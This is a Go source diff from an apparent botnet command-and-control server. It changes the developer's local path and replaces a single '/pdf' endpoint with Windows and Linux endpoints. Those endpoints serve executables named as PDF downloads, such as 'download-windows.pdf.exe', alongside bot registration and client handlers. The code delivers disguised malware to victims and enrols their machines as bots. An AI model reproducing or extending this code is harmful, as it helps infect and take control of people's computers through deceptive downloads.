@@ -14,9 +14,9 @@ import (
 	"time"
 )
 
-var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
 
-//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
 
 type bot struct {
 	Id       string `json:"bot_id"`
@@ -163,8 +163,12 @@ func statusupdater() {
 	}
 }
 
-func pdfserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download.pdf.exe"))
+func windowspdfserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download-windows.pdf.exe"))
+}
+
+func linuxpdfserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download-linux"))
 }
 
 func clientserver(res http.ResponseWriter, req *http.Request) {
@@ -214,7 +218,9 @@ func newRouter() *mux.Router {
 
 	fmt.Printf("Starting server at port 8081\n")
 
-	r.HandleFunc("/pdf", pdfserver)
+	r.HandleFunc("/windows-pdf", windowspdfserver)
+
+	r.HandleFunc("/linux-pdf", linuxpdfserver)
 
 	r.HandleFunc("/register", register)
 
